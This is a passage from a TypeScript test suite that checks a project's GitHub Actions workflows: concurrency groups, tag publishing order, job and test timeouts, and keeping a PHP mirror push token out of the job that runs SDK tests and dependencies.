    // github.ref would put every push to main in one group, where a third push cancels the pending
    // run of the second and that commit never gets tests or an image.
    expect(concurrency?.group).not.toMatch(/github\.ref\b/);
  });

  it('never publishes the branch tag from the build step', () => {
    const tagRules = dockerSteps()
      .filter(step => (step.uses ?? '').startsWith('docker/metadata-action'))
      .map(step => String((step.with as { tags?: string } | undefined)?.tags ?? ''));
    expect(tagRules.length).toBe(1);
    expect(executableLines(tagRules.join('\n'))).not.toContain('type=ref,event=branch');
  });

  it('re-points the branch tag as the last step, after the smoke, on push, only at the branch head', () => {
    const steps = dockerSteps();
    const smoke = steps.findIndex(step => executableLines(step.run ?? '').includes('smoke-test-non-root.sh'));
    const retag = steps.findIndex(step => executableLines(step.run ?? '').includes('imagetools create'));
    expect(smoke).toBeGreaterThan(-1);
    expect(retag).toBeGreaterThan(smoke);
    // Last, so every check added to this job gates the branch tag, not only the non-root smoke.
    expect(retag).toBe(steps.length - 1);
    const step = steps[retag];
    expect(step.if ?? '').toContain("github.event_name == 'push'");
    const run = executableLines(step.run ?? '');
    expect(run).toMatch(/git ls-remote/);
    expect(run).toMatch(/GITHUB_SHA/);
  });
});

/**
 * A job without `timeout-minutes` runs to GitHub's 360-minute default. A hung dashboard test run once
 * held its job for half an hour and still reported green, and a stalled apt mirror held another for
 * over an hour, so every job carries its own bound: a hang turns into a prompt red job instead.
 */
describe('every workflow job declares a bounded timeout', () => {
  type TimedWorkflow = { jobs?: Record<string, { 'timeout-minutes'?: unknown }> };
  const workflows = fs.readdirSync(workflowDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));
  const jobs = workflows.flatMap(file =>
    Object.entries((workflowOf(file) as TimedWorkflow).jobs ?? {}).map(([job, def]) => ({
      id: `${file}:${job}`,
      timeout: def['timeout-minutes'],
    })),
  );

  it('finds the jobs of every workflow', () => {
    expect(jobs.length).toBeGreaterThanOrEqual(30);
  });

  it('gives each job a timeout between 1 and 120 minutes', () => {
    const unbounded = jobs
      .filter(({ timeout }) => !(Number.isInteger(timeout) && (timeout as number) > 0 && (timeout as number) <= 120))
      .map(({ id, timeout }) => `${id} (${String(timeout)})`);
    expect(unbounded).toEqual([]);
  });
});

/**
 * The dashboard's unit tests stalled for half an hour on a leaked timer and still reported green,
 * because node:test waits for the event loop to drain and nothing bounded it. The per-test timeout
 * turns that into a failure naming the file; the step timeout backstops a hang the runner cannot
 * attribute to a test.
 */
describe('the dashboard unit tests are bounded', () => {
  const dashboardScripts = (): Record<string, string> =>
    (
      JSON.parse(fs.readFileSync(path.join(__dirname, '..', '..', 'dashboard', 'package.json'), 'utf8')) as {
        scripts: Record<string, string>;
      }
    ).scripts;

  it('runs test:unit and test:cov with a per-test timeout, and test through test:unit', () => {
    const scripts = dashboardScripts();
    expect(scripts['test:unit']).toMatch(/--test-timeout=\d+/);
    expect(scripts['test:cov']).toMatch(/--test-timeout=\d+/);
    // --test-force-exit would hide the very leak the timeout exposes.
    expect(scripts['test:unit']).not.toContain('--test-force-exit');
    expect(scripts.test).toBe('npm run test:unit');
  });

  it.each(['ci.yml', 'release.yml'])('%s bounds the dashboard unit test step', file => {
    type TimedStep = Step & { 'timeout-minutes'?: unknown };
    const workflow = yaml.load(fs.readFileSync(path.join(workflowDir, file), 'utf8')) as {
      jobs?: Record<string, { steps?: TimedStep[] }>;
    };
    const steps = Object.values(workflow.jobs ?? {})
      .flatMap(job => job.steps ?? [])
      .filter(step => executableLines(step.run ?? '').includes('npm run test:unit'));
    expect(steps.length).toBe(1);
    expect(steps[0]['timeout-minutes']).toEqual(expect.any(Number));
  });
});

/**
 * The PHP release and the mirror workflow push to the mirror with a personal access token. The SDK's
 * tests, and the dev dependencies they run, execute in a job of their own that holds no secret, and the
 * job that pushes takes a fresh checkout, installs nothing and runs only git, with hooks switched off.
 * Each rule is read over every command position of a line and over the job's own environment, not only
 * the first word of a step: `cd sdk/php && composer install` and a token set at job level are the usual
 * shapes of the mistake.
 */
describe.each([
  ['php-sdk-release.yml', 'release'],
  ['split-php-sdk.yml', 'split'],
])('%s keeps the mirror token away from the SDK test run', (file, pusher) => {
  type PhpJob = { needs?: string | string[]; env?: unknown; steps?: Step[] };
  const jobs = (): Record<string, PhpJob> => (workflowOf(file) as unknown as { jobs: Record<string, PhpJob> }).jobs;
  const runsOf = (job: PhpJob): string => (job.steps ?? []).map(step => executableLines(step.run ?? '')).join('\n');
  const TOKEN = 'PHP_SDK_SPLIT_TOKEN';
  const workflowEnv = (): unknown => (workflowOf(file) as unknown as { env?: unknown }).env;
  // The whole job and the workflow's env: a token in the job's container, services or outputs counts too.
  const usesToken = (job: PhpJob): boolean => JSON.stringify([workflowEnv(), job]).includes(TOKEN);
  // Any secret but the run's own token: `secrets['X']` and `toJSON(secrets)` hand the job the mirror token as well.
  const ANY_SECRET = /\bsecrets(?:\.(?!GITHUB_TOKEN\b)|\s*\[|\s*\))/;
  const holdsSecret = (job: PhpJob): boolean => ANY_SECRET.test(JSON.stringify([workflowEnv(), job]));
  // The command each segment of a line starts with, after env assignments and the usual wrappers, so that
  // `cd sdk/php && composer install` and `(cd sdk/php; phpunit)` are read as the commands they run, and
  // a word inside an echoed message is not.
  const WRAPPERS = new Set([
    ...['sudo', 'exec', 'command', 'time', 'env', 'nohup', 'xargs', 'nice', 'timeout', 'stdbuf', 'setsid', 'eval'],
    ...['!', '{', 'if', 'then', 'do', 'else', 'elif', 'while', 'until'],
  ]);
  const SHELLS = new Set(['sh', 'bash', 'dash', 'zsh']);
  const unquote = (word: string): string => word.replace(/^[\\"']+|["']+$/g, '');
  const startsWith = (run: string): string[] =>
    run
      .split('\n')
      .flatMap(line => line.split(/&&|\|\||[;|&()`]|\$\(/))
      .flatMap(segment => {
        const words = segment.trim().split(/\s+/).filter(Boolean);
        let wrapped = false;
        for (;;) {
          const word = words[0] ?? '';
          if (WRAPPERS.has(word)) wrapped = true;
          else if (!/^[A-Za-z_]\w*=/.test(word) && !(wrapped && (word.startsWith('-') || /^\d+[smhd]?$/.test(word))))
            break;
          words.shift();
        }
        const word = unquote(words[0] ?? '');
        // `sh -c "composer install"`: the string is a command line of its own.
        if (SHELLS.has(word) && words[1] === '-c') return [word, ...startsWith(unquote(words.slice(2).join(' ')))];
        return word ? [word] : [];
      });
  const isProjectCommand = (word: string): boolean =>
    /(?:^|\/)(?:composer\d*|php[\d.]*(?:-[a-z]+)?|phpunit)(?:\.phar)?$/.test(word) ||
    /vendor\/bin|scripts\//.test(word);
  // A repository script or a vendored binary handed to an interpreter (`bash ./scripts/x.sh`) is no command word.
  const SCRIPT_WORD = /vendor\/bin|(?:^|[\s'"=])(?:\.\/)?scripts\//;

  it('runs the tests in a job that holds no token, and the push in a job that needs it', () => {
    const entries = Object.entries(jobs());
    const testers = entries.filter(([, job]) => /\bphpunit\b/.test(runsOf(job)));
    const pushers = entries.filter(([, job]) => usesToken(job));
    expect(testers.map(([name]) => name)).toEqual(['test']);
    expect(pushers.map(([name]) => name)).toEqual([pusher]);
    expect(usesToken(jobs().test)).toBe(false);
    expect(holdsSecret(jobs().test)).toBe(false);
    expect([jobs()[pusher].needs].flat()).toContain('test');
  });

  it('runs no PHP, Composer or project script, at any command position, in the job that holds the token', () => {
    expect(startsWith(runsOf(jobs()[pusher])).filter(isProjectCommand)).toEqual([]);
    expect(runsOf(jobs()[pusher])).not.toMatch(SCRIPT_WORD);
  });

  it('uses no action but the checkout in the job that holds the token', () => {
    const uses = (jobs()[pusher].steps ?? []).map(step => step.uses).filter(Boolean) as string[];
    expect(uses.length).toBeGreaterThan(0);
    expect(uses.filter(action => !/^actions\/checkout@[0-9a-f]{40}$/.test(action))).toEqual([]);
  });

  it('names core.hooksPath on the push that carries the token', () => {
    const pushes = runsOf(jobs()[pusher])
      .split('\n')
      .filter(line => /\bgit\b.*\bpush\b/.test(line));
    // The mirror workflow pushes with the URL on a continuation line, so the line is the `git push`.
    expect(pushes.length).toBeGreaterThan(0);
    for (const line of pushes) expect(line).toContain('core.hooksPath=/dev/null');
  });

  it('finds Composer, PHP and the token in the shapes the pins read', () => {
    for (const line of [
      'cd sdk/php && composer install --no-interaction',
      'php -v',
      '(cd sdk/php; phpunit)',
      'x=1 ./vendor/bin/phpunit',
      'sudo -n composer.phar update',
      './scripts/anything.sh',
      'timeout 60 composer install',
      'sh -c "composer install"',
      'if true; then composer install; fi',
      '{ php -v; }',
      'sleep 1 & composer install',
      'eval composer install',
      '! composer install',
      '"composer" install',
      'php8.2 -v',
    ]) {
      expect(startsWith(line).some(isProjectCommand)).toBe(true);
    }
    for (const line of [
      'bash ./scripts/anything.sh',
      'source ./scripts/x.sh',
      '. ./scripts/x.sh',
      'sh vendor/bin/phpunit',
    ]) {
      expect(SCRIPT_WORD.test(line)).toBe(true);
    }
    for (const line of [
      'git push origin main',
      'echo "must run from a php-sdk-v* tag"',
      'echo phpstorm',
      'git -c core.hooksPath=/dev/null push',
      'SPLIT_SHA="$(git subtree split --prefix=sdk/php HEAD)"',
      'echo "Mirrored sdk/php -> rmyndharis/openwa-php@main"',
    ]) {
      expect(startsWith(line).some(isProjectCommand)).toBe(false);
      expect(SCRIPT_WORD.test(line)).toBe(false);
    }
    expect(usesToken({ env: { SPLIT: `\${{ secrets.${TOKEN} }}` }, steps: [] })).toBe(true);
    expect(usesToken({ steps: [{ run: 'x', env: { SPLIT: `\${{ secrets.${TOKEN} }}` } }] })).toBe(true);
    expect(usesToken({ steps: [{ run: 'x', with: { token: `\${{ secrets.${TOKEN} }}` } }] })).toBe(true);
    expect(usesToken({ steps: [{ run: 'x' }] })).toBe(false);
  });
});
